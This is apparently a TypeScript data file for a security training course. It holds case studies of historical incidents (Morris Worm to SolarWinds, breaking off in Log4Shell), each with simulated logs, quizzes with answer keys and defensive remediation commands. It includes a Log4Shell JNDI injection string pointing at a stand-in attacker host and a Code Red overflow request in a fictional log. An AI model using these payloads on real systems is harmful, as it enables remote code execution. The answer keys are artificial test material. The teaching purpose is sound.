export interface RealIncident {
  id: string;
  name: string;
  year: number;
  sector: string;
  incidentType: 'Ransomware' | 'Data Breach' | 'Supply Chain' | 'Web Application' | 'Malware' | 'Social Engineering' | 'Critical Infrastructure' | 'Zero-Day';
  difficulty: 'Beginner' | 'Easy' | 'Intermediate' | 'Hard' | 'Advanced' | 'Master';
  whatHappened: string;
  initialAttackVector: string;
  attackChain: string[];
  securityWeakness: string;
  whatAttackersAchieved: string;
  impact: string;
  howItWasDetected: string;
  whatDefendersCouldHaveDone: string;
  mitigations: string[];
  lessonsForEthicalHackers: string;
  lessonsForBlueTeam: string;
  mitreMapping: { tactic: string; techniqueId: string; techniqueName: string }[];
  relatedSkills: string[];
  timeline: { stage: string; title: string; detail: string; timestamp: string }[];
  safeSimulation: {
    labTitle: string;
    scenario: string;
    targetHost: string;
    fictionalLogs: string;
    investigationQuestions: {
      question: string;
      options: string[];
      correctIndex: number;
      explanation: string;
    }[];
    remediationTask: string;
    verificationCommand: string;
  };
  quiz: {
    question: string;
    options: string[];
    correctIndex: number;
    explanation: string;
  };
  aiDebrief: {
    discoveryPrompt: string;
    rootCausePrompt: string;
    evidencePrompt: string;
    defensePrompt: string;
    takeawayPrompt: string;
  };
}

export const REAL_WORLD_INCIDENTS: RealIncident[] = [
  {
    id: 'inc-01',
    name: 'Morris Worm',
    year: 1988,
    sector: 'Early Internet & Academia',
    incidentType: 'Malware',
    difficulty: 'Beginner',
    whatHappened: 'The first major self-propagating computer worm released across the ARPANET, infecting approximately 10% of all connected Unix hosts within hours.',
    initialAttackVector: 'Buffer overflow in fingerd daemon, sendmail DEBUG command abuse, and dictionary guessing via rsh/rexec.',
    attackChain: [
      '1. Target host identification across class A/B subnets',
      '2. Fingerd buffer overflow payload execution',
      '3. Sendmail trapdoor spawning remote shell',
      '4. Self-replication and re-infection loop causing resource exhaustion'
    ],
    securityWeakness: 'Unchecked memory buffers in C (gets), backdoors left enabled in mail daemons, and trusted host authentication (.rhosts).',
    whatAttackersAchieved: 'Massive denial of service across university and military networks due to uncontrollable reinfection processes.',
    impact: 'Catalyzed the creation of the first Computer Emergency Response Team (CERT) and established internet vulnerability disclosure norms.',
    howItWasDetected: 'System administrators noticed catastrophic CPU loads and process table exhaustion across thousands of Sun and VAX machines.',
    whatDefendersCouldHaveDone: 'Disabled debug mode in sendmail, bounds-checked string input buffers, and limited rsh trust relationships.',
    mitigations: ['Remove debug functions from production daemons', 'Enforce safe string handling (fgets instead of gets)', 'Segment networks and disable legacy trust protocols'],
    lessonsForEthicalHackers: 'Unintended propagation mechanisms can transform a research tool into an uncontrollable denial of service weapon.',
    lessonsForBlueTeam: 'Process monitoring, resource threshold alerts, and rapid vendor patch coordination are critical for containment.',
    mitreMapping: [
      { tactic: 'Execution', techniqueId: 'T1203', techniqueName: 'Exploitation for Client Execution' },
      { tactic: 'Lateral Movement', techniqueId: 'T1210', techniqueName: 'Exploitation of Remote Services' }
    ],
    relatedSkills: ['Linux Fundamentals', 'Buffer Overflow Basics', 'Service Auditing', 'Incident Response'],
    timeline: [
      { stage: 'Discovery', title: 'Target Identification', detail: 'Worm probes class A and B IP subnets looking for active Unix servers.', timestamp: 'Day 1 18:00' },
      { stage: 'Initial Access', title: 'Fingerd Overflow', detail: 'Sends 536-byte string to fingerd triggering stack overflow to execute sh.', timestamp: 'Day 1 20:30' },
      { stage: 'Execution', title: 'Daemon Spawning', detail: 'Spawns background replication loop without checking previous infection state.', timestamp: 'Day 1 21:15' },
      { stage: 'Impact', title: 'Process Exhaustion', detail: 'Hosts freeze with 100+ copies of the worm consuming all CPU cycles.', timestamp: 'Day 2 03:00' },
      { stage: 'Recovery', title: 'Source Code Reverse Engineered', detail: 'UC Berkeley and MIT teams decompile the worm and release emergency patches.', timestamp: 'Day 2 12:00' }
    ],
    safeSimulation: {
      labTitle: 'Legacy Daemon Buffer & Debug Trap Triage',
      scenario: 'A simulated legacy Unix server running a vulnerable fingerd daemon has become sluggish. Audit the process logs and inspect the payload.',
      targetHost: '10.10.10.12 (sim-unix-node)',
      fictionalLogs: `[2026-08-21 02:14:01] fingerd[4012]: Connection from 10.10.10.88:51234\n[2026-08-21 02:14:01] fingerd[4012]: WARNING - Input exceeds buffer 512 bytes (received 536 bytes)\n[2026-08-21 02:14:02] kernel: [412.981] fingerd[4012] segfault at 7fff54128000 ip 0000000000401128 sp 7fff54127de0\n[2026-08-21 02:14:02] systemd[1]: Spawned session-41.scope for /bin/sh (PID 4015)\n[2026-08-21 02:14:03] process_table: PID 4015 spawning child worm process`,
      investigationQuestions: [
        {
          question: 'What is the primary indicator of compromise in the fingerd log stream?',
          options: ['An input length of 536 bytes exceeding the 512-byte allocated buffer causing a segfault and shell spawn', 'An invalid password entered by user student', 'A database connection timeout', 'An SSL certificate expiration'],
          correctIndex: 0,
          explanation: 'The log records input exceeding 512 bytes followed by a segmentation fault and unauthorized /bin/sh spawn.'
        }
      ],
      remediationTask: 'Disable the legacy unauthenticated finger daemon and verify inetd/systemd disables listening on port 79.',
      verificationCommand: 'systemctl stop fingerd && systemctl disable fingerd'
    },
    quiz: {
      question: 'Why did the Morris Worm cause widespread computer crashes despite not carrying a destructive data-wiping payload?',
      options: ['It deleted the root filesystem', 'It reinfected machines multiple times, creating runaway processes that consumed 100% of CPU and process table space', 'It changed the BIOS passwords', 'It physically overheated monitors'],
      correctIndex: 1,
      explanation: 'Flawed logic in its reinfection check caused it to continually re-infect already infected systems until they froze.'
    },
    aiDebrief: {
      discoveryPrompt: 'What system anomaly first signaled the presence of the worm in the simulation?',
      rootCausePrompt: 'Why is using unchecked input buffers in C programs dangerous for service daemons?',
      evidencePrompt: 'Which log entry confirmed that an interactive shell was spawned by the daemon process?',
      defensePrompt: 'How do modern compilers and operating systems prevent this exact class of stack overflow?',
      takeawayPrompt: 'What fundamental security rule about input validation and debug features does this case reinforce?'
    }
  },
  {
    id: 'inc-02',
    name: 'Code Red',
    year: 2001,
    sector: 'Enterprise Web Infrastructure',
    incidentType: 'Web Application',
    difficulty: 'Easy',
    whatHappened: 'A self-replicating worm targeted Microsoft IIS web servers by exploiting a buffer overflow in the indexing service ISAPI filter DLL.',
    initialAttackVector: 'HTTP GET request containing 224 \'N\' characters followed by shellcode sent to /default.ida.',
    attackChain: [
      '1. Automated scanning on TCP port 80 across random IP ranges',
      '2. Exploitation of idq.dll memory overflow in Microsoft IIS',
      '3. Defacement of website ("Hacked By Chinese!")',
      '4. Hardcoded DDoS routine targeting the White House web IP'
    ],
    securityWeakness: 'Unpatched dynamic link library (idq.dll) active by default on IIS servers.',
    whatAttackersAchieved: 'Infected over 359,000 servers in less than 14 hours, degrading global internet routing.',
    impact: 'Demonstrated the extreme velocity of automated internet-wide web server exploitation.',
    howItWasDetected: 'Web application firewalls and IDS sensors flagged millions of identical GET /default.ida requests.',
    whatDefendersCouldHaveDone: 'Applied Microsoft Security Bulletin MS01-033 released one month prior to the outbreak.',
    mitigations: ['Disable unused ISAPI extension mappings', 'Apply vendor security updates promptly', 'Deploy perimeter web intrusion prevention systems'],
    lessonsForEthicalHackers: 'Mass scanning and exploitation can propagate across the global internet in minutes if default installations are left unpatched.',
    lessonsForBlueTeam: 'Software asset inventory and rapid patch management cycles prevent known CVE exploitation.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Impact', techniqueId: 'T1498', techniqueName: 'Network Denial of Service' }
    ],
    relatedSkills: ['Web Security', 'HTTP Inspection', 'Patch Management', 'IDS/IPS'],
    timeline: [
      { stage: 'Discovery', title: 'Internet Probing', detail: 'Infected nodes send SYN packets on port 80 to randomized 24-bit IP subnets.', timestamp: 'Day 1 00:00' },
      { stage: 'Exploitation', title: 'IDA Buffer Overflow', detail: 'Sends HTTP GET /default.ida?NNNNNNNN... with payload directly into memory.', timestamp: 'Day 1 04:00' },
      { stage: 'Defacement', title: 'HTML Injected', detail: 'In-memory hook displays defacement message to all web visitors.', timestamp: 'Day 1 09:00' },
      { stage: 'DDoS Phase', title: 'Packet Flood', detail: 'Worm shifts to high-volume SYN flood targeting 198.137.240.91.', timestamp: 'Day 1 20:00' }
    ],
    safeSimulation: {
      labTitle: 'ISAPI Extension Request Triage',
      scenario: 'Inspect web server access logs for anomalous .ida queries and configure extension filtering.',
      targetHost: '10.10.10.15 (sim-iis-node)',
      fictionalLogs: `10.10.10.92 - - [21/Aug/2026:04:12:01 +0000] "GET /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858 HTTP/1.0" 200 3418\n10.10.10.92 - - [21/Aug/2026:04:12:02 +0000] "GET /default.ida?X=1 HTTP/1.0" 404 212`,
      investigationQuestions: [
        {
          question: 'What distinctive payload signature appears in the GET request URI?',
          options: ['A massive repeated sequence of N characters combined with unicode shellcode pointers (%u9090)', 'A SQL injection UNION SELECT statement', 'A cross-site scripting <script> tag', 'A legitimate CSS stylesheet request'],
          correctIndex: 0,
          explanation: 'Code Red used repeated N bytes to overflow the stack buffer followed by %u9090 NOP sleds.'
        }
      ],
      remediationTask: 'Unmap the .ida extension from the web server configuration and apply the virtual patch.',
      verificationCommand: 'grep -v "default.ida" /etc/nginx/sites-available/default'
    },
    quiz: {
      question: 'What was the primary root cause of the Code Red worm outbreak?',
      options: ['Unpatched buffer overflow in the web server index mapping DLL', 'Stolen SSH keys on GitHub', 'Phishing emails with malicious Word macros', 'Weak Wi-Fi passwords'],
      correctIndex: 0,
      explanation: 'Code Red exploited a known buffer overflow vulnerability in Microsoft IIS idq.dll index filter.'
    },
    aiDebrief: {
      discoveryPrompt: 'What made the URI request in the access log immediately suspicious?',
      rootCausePrompt: 'Why are default enabled features and unused extensions dangerous in web servers?',
      evidencePrompt: 'Which HTTP status code indicated that the server processed the oversized query string?',
      defensePrompt: 'How can modern WAF rules block buffer overflow attempts before reaching web handlers?',
      takeawayPrompt: 'Why is asset inventory and patch timeliness vital to defensive posture?'
    }
  },
  {
    id: 'inc-03',
    name: 'SQL Slammer',
    year: 2003,
    sector: 'Database Infrastructure & Telecommunications',
    incidentType: 'Zero-Day',
    difficulty: 'Easy',
    whatHappened: 'A tiny 376-byte worm transmitted over connectionless UDP port 1434 caused massive internet slowdowns in less than 10 minutes.',
    initialAttackVector: 'Buffer overflow in Microsoft SQL Server Desktop Engine (MSDE) listening on UDP port 1434.',
    attackChain: [
      '1. Generation of random IPv4 addresses',
      '2. Single 376-byte UDP datagram sent to port 1434',
      '3. In-memory buffer overflow immediately hijacks execution',
      '4. Endless high-speed loop broadcasting packet to new targets'
    ],
    securityWeakness: 'UDP services listening on public network interfaces without authentication or input validation.',
    whatAttackersAchieved: 'Infected 75,000 servers in 10 minutes; took Bank of America ATMs offline and caused airline flight cancellations.',
    impact: 'Demonstrated the extreme power of memory-only UDP worms with zero disk footprint.',
    howItWasDetected: 'Global ISP routers dropped BGP peering sessions due to massive UDP packet packet-per-second volume.',
    whatDefendersCouldHaveDone: 'Blocked UDP port 1434 at the border firewall and applied MS02-039.',
    mitigations: ['Never expose internal database listener ports to the public internet', 'Enforce perimeter egress and ingress firewall ACLs', 'Apply security patches'],
    lessonsForEthicalHackers: 'Connectionless UDP attacks can generate unprecedented packet rates because no 3-way handshake is required.',
    lessonsForBlueTeam: 'Firewall rules that default to deny all incoming database ports protect even unpatched internal servers.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Impact', techniqueId: 'T1498', techniqueName: 'Network Denial of Service' }
    ],
    relatedSkills: ['UDP Protocols', 'Firewall ACLs', 'Port Filtering', 'Packet Analysis'],
    timeline: [
      { stage: 'Discovery', title: 'First Transmission', detail: 'Single 376-byte UDP packet sent to UDP 1434.', timestamp: 'Day 1 05:29' },
      { stage: 'Exponential Spread', title: 'Global Doubling Every 8.5s', detail: 'Infection doubles every 8.5 seconds worldwide.', timestamp: 'Day 1 05:35' },
      { stage: 'Core Network Saturation', title: 'BGP Routing Collapse', detail: 'ISP backbone routers run out of buffer memory and crash.', timestamp: 'Day 1 05:40' },
      { stage: 'Containment', title: 'Port 1434 Global Filter', detail: 'Tier 1 transit providers apply global ACLs on UDP 1434.', timestamp: 'Day 1 07:00' }
    ],
    safeSimulation: {
      labTitle: 'Database UDP Port Perimeter Hardening',
      scenario: 'Audit active firewall rules to verify that external traffic cannot reach internal database listener port 1434.',
      targetHost: '10.10.10.20 (sim-db-gateway)',
      fictionalLogs: `[FIREWALL ALERT] IN=eth0 OUT= SRC=198.51.100.44 DST=10.10.10.20 PROTO=UDP SPT=54211 DPT=1434 LEN=376\n[FIREWALL ALERT] IN=eth0 OUT= SRC=203.0.113.89 DST=10.10.10.20 PROTO=UDP SPT=61124 DPT=1434 LEN=376\n[SYS-AUDIT] Active listener on 0.0.0.0:1434/UDP (sqlserver.exe)`,
      investigationQuestions: [
        {
          question: 'What network configuration error allowed the 376-byte exploit packets to reach the database server?',
          options: ['UDP port 1434 was left exposed and unfiltered on the public-facing perimeter interface', 'DNS records were misconfigured', 'The server was using an unencrypted HTTP proxy', 'The hard drive was formatted as FAT32'],
          correctIndex: 0,
          explanation: 'Database listener ports must never be directly accessible from the untrusted public internet.'
        }
      ],
      remediationTask: 'Apply iptables rule to drop incoming UDP packets on port 1434 at the border.',
      verificationCommand: 'iptables -A INPUT -p udp --dport 1434 -j DROP'
    },
    quiz: {
      question: 'Why was SQL Slammer able to spread significantly faster than previous TCP-based worms like Code Red?',
      options: ['It sent single UDP packets without waiting for a 3-way TCP handshake', 'It was written in assembly language', 'It used satellite internet', 'It infected BIOS chips'],
      correctIndex: 0,
      explanation: 'Because UDP is connectionless, Slammer could blast exploit packets as fast as the network card could transmit them.'
    },
    aiDebrief: {
      discoveryPrompt: 'What protocol and port characteristic allowed the attack to flood network pipes so rapidly?',
      rootCausePrompt: 'Why should database listener ports never be exposed on public IP addresses?',
      evidencePrompt: 'What was the specific packet size in bytes recorded across all incoming connections?',
      defensePrompt: 'How does an ingress firewall default-deny policy prevent this vulnerability category?',
      takeawayPrompt: 'What is the lesson regarding defense-in-depth when software patches are delayed?'
    }
  },
  {
    id: 'inc-04',
    name: 'Stuxnet',
    year: 2010,
    sector: 'Industrial Control Systems & Critical Infrastructure',
    incidentType: 'Critical Infrastructure',
    difficulty: 'Master',
    whatHappened: 'A highly sophisticated nation-state cyber weapon designed to sabotage nuclear centrifuge Programmable Logic Controllers (PLCs) at Natanz.',
    initialAttackVector: 'Infected USB flash drives exploiting Windows LNK zero-day (CVE-2010-2568) to cross air-gapped facility networks.',
    attackChain: [
      '1. Initial infection via USB auto-execution in air-gapped environment',
      '2. Exploitation of 4 distinct zero-day vulnerabilities',
      '3. Stolen digital certificates (Realtek/JMicron) for kernel driver signing',
      '4. Search for Siemens Step 7 PLC software',
      '5. Man-in-the-Middle modification of centrifuge rotational speeds while spoofing normal telemetry'
    ],
    securityWeakness: 'Air-gap reliance without physical device controls, lack of integrity verification on PLC logic commands.',
    whatAttackersAchieved: 'Physically damaged over 1,000 uranium enrichment centrifuges by causing extreme rotational frequency variations.',
    impact: 'Proved that cyber attacks can cause direct physical destruction of physical industrial machinery.',
    howItWasDetected: 'VirusBlokAda researchers investigated unexplained BSODs on Iranian workstations.',
    whatDefendersCouldHaveDone: 'Enforced strict physical USB lockdown, signed firmware on PLCs, and implemented independent out-of-band analog monitoring.',
    mitigations: ['Disable Removable Media / USB ports on critical OT networks', 'Cryptographic signing of PLC ladder logic', 'Independent analog sensor monitoring'],
    lessonsForEthicalHackers: 'Physical isolation (air-gaps) can be bypassed via supply chain and physical removable media vectors.',
    lessonsForBlueTeam: 'Never trust digital telemetry alone; validate physical sensor measurements with out-of-band verification.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1091', techniqueName: 'Replication Through Removable Media' },
      { tactic: 'Defense Evasion', techniqueId: 'T1553.002', techniqueName: 'Subvert Trust Controls: Code Signing' },
      { tactic: 'Impact', techniqueId: 'T0831', techniqueName: 'Manipulation of Control' }
    ],
    relatedSkills: ['Digital Forensics', 'Malware Analysis', 'Zero-Day Auditing', 'OT/ICS Security'],
    timeline: [
      { stage: 'Air-gap Breach', title: 'USB Insertion', detail: 'Infected USB stick inserted into contractor laptop.', timestamp: 'Month 1' },
      { stage: 'Lateral Movement', title: 'RPC & SMB Zero-Days', detail: 'Spreads internally using MS10-061 print spooler exploit.', timestamp: 'Month 2' },
      { stage: 'Reconnaissance', title: 'Siemens Step 7 Search', detail: 'Scans for WinCC project files and Profibus network links.', timestamp: 'Month 3' },
      { stage: 'Physical Sabotage', title: 'Centrifuge Over-spin', detail: 'Alters frequency converter drive to 1,410 Hz then drops to 2 Hz.', timestamp: 'Month 6' }
    ],
    safeSimulation: {
      labTitle: 'Removable Media Execution & Driver Certificate Triage',
      scenario: 'Analyze a simulated endpoint log capturing an unsigned driver load attempt and unusual shortcut LNK parsing.',
      targetHost: '10.10.10.35 (sim-ot-workstation)',
      fictionalLogs: `[2026-08-21 10:15:22] System: Removable media connected (Volume: FLASH_DRIVE)\n[2026-08-21 10:15:23] Explorer: Shell32.dll parsed ~WTR4141.tmp via CVE-2010-2568 LNK handler\n[2026-08-21 10:15:24] Kernel: Driver mrxcls.sys loaded with certificate 'Realtek Semiconductor Corp.'\n[2026-08-21 10:15:25] Process: s7otbxdx.dll injected into Siemens Step 7 engineering software`,
      investigationQuestions: [
        {
          question: 'How did the malicious driver bypass standard Windows 64-bit kernel driver signing enforcement?',
          options: ['It was signed using a legitimate stolen digital certificate from Realtek', 'It disabled the CPU power cable', 'It used an HTTP proxy', 'It changed the monitor resolution'],
          correctIndex: 0,
          explanation: 'The attackers stole valid private code-signing keys from legitimate hardware manufacturers to sign their kernel drivers.'
        }
      ],
      remediationTask: 'Revoke compromised certificate thumbprint in the Windows Certificate Trust List (CTL).',
      verificationCommand: 'certutil -addstore Disallowed /tmp/stolen_realtek.cer'
    },
    quiz: {
      question: 'What made Stuxnet historically unique in the history of cybersecurity?',
      options: ['It was the first documented malware that caused direct physical destruction of industrial equipment', 'It only infected smartphones', 'It sent spam emails for luxury watches', 'It decrypted Bitcoin wallets'],
      correctIndex: 0,
      explanation: 'Stuxnet specifically targeted industrial PLCs to physically tear apart uranium enrichment centrifuges.'
    },
    aiDebrief: {
      discoveryPrompt: 'What deceptive technique did the malware use when modifying physical centrifuge speeds?',
      rootCausePrompt: 'Why is an air-gap insufficient if physical access control on removable media is neglected?',
      evidencePrompt: 'What evidence in the log demonstrated that code was executed before the user opened any file?',
      defensePrompt: 'How do modern industrial control environments enforce cryptographic verification on PLC logic?',
      takeawayPrompt: 'What does this case teach us about the convergence of cyber threats and physical safety?'
    }
  },
  {
    id: 'inc-07',
    name: 'WannaCry',
    year: 2017,
    sector: 'Healthcare, Telecom & Global Enterprise',
    incidentType: 'Ransomware',
    difficulty: 'Intermediate',
    whatHappened: 'A ransomware cryptoworm infected more than 200,000 computers across 150 countries within hours, crippling NHS hospitals in the UK.',
    initialAttackVector: 'EternalBlue (CVE-2017-0144) exploiting an SMBv1 remote code execution vulnerability over TCP port 445.',
    attackChain: [
      '1. Internet-wide scanning on TCP port 445 (SMB)',
      '2. Exploitation of buffer overflow in SMBv1 kernel driver (srv.sys)',
      '3. DoublePulsar backdoor installation in kernel memory',
      '4. Encryption of documents with RSA-2048 + AES-128',
      '5. Killswitch domain query check: iqss...[.]com'
    ],
    securityWeakness: 'Legacy SMBv1 enabled by default, port 445 exposed to the internet, and delayed application of Microsoft patch MS17-010.',
    whatAttackersAchieved: 'Locked hundreds of thousands of critical medical and enterprise systems, demanding $300 in Bitcoin per host.',
    impact: 'Disrupted emergency rooms, delayed medical surgeries, and caused an estimated $4 billion in global economic damages.',
    howItWasDetected: 'Security researcher Marcus Hutchins identified an unregistered domain in the decompiled binary and registered it to activate the built-in killswitch.',
    whatDefendersCouldHaveDone: 'Applied security update MS17-010 (released 2 months prior), disabled SMBv1, and blocked port 445 at the firewall.',
    mitigations: ['Disable SMBv1 across all endpoints and servers', 'Block inbound TCP ports 139 and 445 at perimeter firewalls', 'Enforce regular immutable offline backups'],
    lessonsForEthicalHackers: 'Combining weaponized zero-days with worm self-propagation mechanisms creates devastating uncontrollable collateral damage.',
    lessonsForBlueTeam: 'Protocols over 20 years old (like SMBv1) must be systematically deprecated and audited across enterprise baselines.',
    mitreMapping: [
      { tactic: 'Lateral Movement', techniqueId: 'T1210', techniqueName: 'Exploitation of Remote Services' },
      { tactic: 'Impact', techniqueId: 'T1486', techniqueName: 'Data Encrypted for Impact' }
    ],
    relatedSkills: ['SMB Security', 'Windows Auditing', 'Patch Management', 'Ransomware Response'],
    timeline: [
      { stage: 'Outbreak', title: 'First Hospital Infections', detail: 'NHS England emergency wards report desktop lockouts.', timestamp: 'Day 1 08:00' },
      { stage: 'Lateral Spread', title: 'EternalBlue Propagation', detail: 'Worm scans internal /24 subnets and random external IPs.', timestamp: 'Day 1 10:30' },
      { stage: 'Encryption', title: 'File Extension .WNCRY', detail: 'Documents encrypted and ransom note @WanaDecryptor@.exe displayed.', timestamp: 'Day 1 12:00' },
      { stage: 'Killswitch Triggered', title: 'Sinkhole Activated', detail: 'Marcus Hutchins registers sinkhole domain, halting new encryption loops.', timestamp: 'Day 1 15:03' }
    ],
    safeSimulation: {
      labTitle: 'SMBv1 Vulnerability Audit & Port 445 Hardening',
      scenario: 'Audit a simulated Windows Server to verify if SMBv1 is enabled and apply registry hardening.',
      targetHost: '10.10.10.45 (sim-win-fileserver)',
      fictionalLogs: `[2026-08-21 08:30:11] EventID 4001: SMBv1 protocol negotiation request from 10.10.10.199:49152\n[2026-08-21 08:30:12] Srv.sys: Buffer allocation mismatch in SrvTransaction2DispatchTable\n[2026-08-21 08:30:13] Kernel: DoublePulsar Ring0 payload verified in memory\n[2026-08-21 08:30:14] FileSystem: Mass rename event detected (*.docx -> *.docx.WNCRY)`,
      investigationQuestions: [
        {
          question: 'Which legacy protocol component in srv.sys was exploited by EternalBlue?',
          options: ['SMBv1 (Server Message Block version 1)', 'HTTP/3 over QUIC', 'Telnet port 23', 'SNMP v3'],
          correctIndex: 0,
          explanation: 'EternalBlue exploited multiple integer overflows and type confusion flaws in the SMBv1 driver.'
        }
      ],
      remediationTask: 'Disable SMBv1 protocol in Windows PowerShell configuration.',
      verificationCommand: 'Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force'
    },
    quiz: {
      question: 'How did Marcus Hutchins halt the rapid global propagation of WannaCry?',
      options: ['By registering an unregistered killswitch domain hardcoded in the worm\'s code', 'By cutting the undersea fiber cables', 'By paying all Bitcoin ransom demands', 'By installing Linux on all computers'],
      correctIndex: 0,
      explanation: 'The malware author included a check: if the domain was live, it halted execution; registering the sinkhole stopped the spread.'
    },
    aiDebrief: {
      discoveryPrompt: 'What port was the primary target of the automated network scanning phase?',
      rootCausePrompt: 'Why do legacy protocols like SMBv1 remain dangerous even on modern operating systems?',
      evidencePrompt: 'Which log event demonstrated that files were actively undergoing cryptographic locking?',
      defensePrompt: 'How can perimeter firewall egress and ingress rules prevent ransomware worm outbreaks?',
      takeawayPrompt: 'Why are automated offline immutable backups essential for ransomware resilience?'
    }
  },
  {
    id: 'inc-10',
    name: 'SolarWinds / SUNBURST',
    year: 2020,
    sector: 'Federal Government & Fortune 500 Enterprise',
    incidentType: 'Supply Chain',
    difficulty: 'Master',
    whatHappened: 'A state-sponsored threat actor (APT29 / Cozy Bear) compromised SolarWinds\' software build system to inject a backdoor into legitimate Orion network management updates.',
    initialAttackVector: 'Compromise of internal Orion software build pipeline (Solorigate) to inject malicious C# code into SolarWinds.Orion.Core.BusinessLayer.dll.',
    attackChain: [
      '1. Infiltration of SolarWinds internal software build environment',
      '2. Automated injection of backdoor during compilation of signed DLLs',
      '3. Distribution of trojanized update to 18,000 customer organizations',
      '4. 2-week dormant period to evade dynamic sandbox detection',
      '5. DNS DGA beaconing to avsvmcloud[.]com to activate targeted second-stage payloads',
      '6. SAML token forgery (Golden SAML) to pivot into Microsoft 365 cloud email environments'
    ],
    securityWeakness: 'Lack of build pipeline integrity verification, blind trust in vendor code-signed binaries.',
    whatAttackersAchieved: 'Gained persistent clandestine access to top-secret US government agencies (Treasury, Homeland Security, State Dept) for over 9 months.',
    impact: 'Redefined global supply-chain cybersecurity; demonstrated that digitally signed legitimate updates can be weaponized.',
    howItWasDetected: 'FireEye discovered unauthorized MFA registrations on their network and traced the initial entry point back to the trojanized Orion DLL.',
    whatDefendersCouldHaveDone: 'Implemented reproducible builds, zero-trust network egress filtering on management servers, and continuous identity audit.',
    mitigations: ['Strict egress filtering on internal management software', 'Implement multi-stage reproducible build pipelines', 'Monitor for Golden SAML token abuse'],
    lessonsForEthicalHackers: 'Attacking the developer build pipeline or upstream vendor allows bypassing all downstream perimeter defenses.',
    lessonsForBlueTeam: 'Even digitally signed software from trusted vendors must be treated with least privilege and network isolation.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1195.002', techniqueName: 'Supply Chain Compromise: Software Supply Chain' },
      { tactic: 'Defense Evasion', techniqueId: 'T1553.002', techniqueName: 'Subvert Trust Controls: Code Signing' },
      { tactic: 'Credential Access', techniqueId: 'T1606.002', techniqueName: 'Forge Web Credentials: SAML Tokens' }
    ],
    relatedSkills: ['Supply Chain Security', 'DNS Telemetry Analysis', 'Cloud Identity (IAM)', 'SAML & Federation'],
    timeline: [
      { stage: 'Build Injection', title: 'Solorigate Code Injected', detail: 'Malicious source file inserted during MSBuild compile run.', timestamp: 'Month 1' },
      { stage: 'Signed Distribution', title: 'Customer Update Pushed', detail: 'Digitally signed update downloaded by 18,000 enterprise customers.', timestamp: 'Month 3' },
      { stage: 'Dormancy & DGA', title: 'DNS Beaconing', detail: 'Backdoor sleeps 14 days, then resolves subdomain on avsvmcloud[.]com.', timestamp: 'Month 4' },
      { stage: 'Cloud Pivot', title: 'Golden SAML Forgery', detail: 'Attackers forge cloud federation tokens to access executive emails without passwords.', timestamp: 'Month 6' },
      { stage: 'Discovery', title: 'FireEye Triage', detail: 'FireEye flags rogue MFA device and publishes comprehensive IoCs.', timestamp: 'Month 9' }
    ],
    safeSimulation: {
      labTitle: 'DNS Domain Generation & DLL Hash Verification',
      scenario: 'Inspect DNS query logs from an internal monitoring server to detect SUNBURST DGA beacon patterns.',
      targetHost: '10.10.10.55 (sim-management-server)',
      fictionalLogs: `[2026-08-21 03:11:04] DNS Query: 10.10.10.55 -> dns-resolver: A query: 4f1a9b82c0.appsync-api.eu-west-1.avsvmcloud[.]com\n[2026-08-21 03:11:05] DNS Response: 10.10.10.55 <- CNAME -> freescanonline[.]com (IP 20.140.0.1)\n[2026-08-21 03:11:10] Process: SolarWinds.Orion.Core.BusinessLayer.dll hash mismatch with upstream vendor pristine baseline`,
      investigationQuestions: [
        {
          question: 'What command-and-control communication channel was used by the SUNBURST backdoor for initial covert check-ins?',
          options: ['Encoded DGA subdomains in DNS A-record queries to avsvmcloud[.]com', 'Unencrypted IRC chat channels', 'Raw Telnet over port 23', 'Direct FTP file uploads'],
          correctIndex: 0,
          explanation: 'SUNBURST encoded victim machine information and environment checks into unique DNS subdomains query strings.'
        }
      ],
      remediationTask: 'Block egress DNS and HTTP communication to avsvmcloud[.]com and isolate the management host.',
      verificationCommand: 'iptables -A OUTPUT -d 20.140.0.0/16 -j DROP'
    },
    quiz: {
      question: 'Why was the SUNBURST trojan so difficult for antivirus and EDR software to detect initially?',
      options: ['It was digitally signed with SolarWinds\' legitimate code signing certificate and stayed dormant for 14 days', 'It was written in Python', 'It did not run on Windows', 'It only worked on holidays'],
      correctIndex: 0,
      explanation: 'The backdoor was compiled directly into the vendor\'s official, signed DLL and delayed execution to bypass sandbox analysis.'
    },
    aiDebrief: {
      discoveryPrompt: 'What characteristic of the DNS query string revealed a covert C2 channel?',
      rootCausePrompt: 'How did compromising the build pipeline compromise thousands of downstream organizations simultaneously?',
      evidencePrompt: 'What identity mechanism was forged to access Microsoft 365 cloud mailboxes without user credentials?',
      defensePrompt: 'How do reproducible build environments and zero-trust egress rules mitigate supply chain risk?',
      takeawayPrompt: 'Why must defenders monitor outbound server connections even for trusted software?'
    }
  },
  {
    id: 'inc-12',
    name: 'Log4Shell',
    year: 2021,
    sector: 'Global Software, Cloud Services & Enterprise Web',
    incidentType: 'Zero-Day',
    difficulty: 'Intermediate',
    whatHappened: 'A critical remote code execution vulnerability (CVE-2021-44228) in the widely used Apache Log4j Java logging library allowed instant server takeover via simple text strings.',
    initialAttackVector: 'JNDI lookup string injection (${jndi:ldap://attacker.com/exploit}) logged via HTTP headers (User-Agent, X-Forwarded-For, query parameters).',
    attackChain: [
      '1. Attacker sends HTTP request containing ${jndi:ldap://...} in header or form input',
      '2. Web application passes the untrusted string to log4j.logger.info()',
      '3. Log4j parses the JNDI prefix and initiates outbound LDAP/RMI connection to attacker server',
      '4. Attacker LDAP server responds with reference to remote Java class file',
      '5. Victim JVM downloads and executes bytecode in root/service process context'
    ],
    securityWeakness: 'Unrestricted JNDI message lookup parsing enabled by default in a ubiquitous open-source logging library.',
    whatAttackersAchieved: 'Massive automated exploitation: cryptominers, ransomware loaders, and state-sponsored espionage actors compromised millions of servers.',
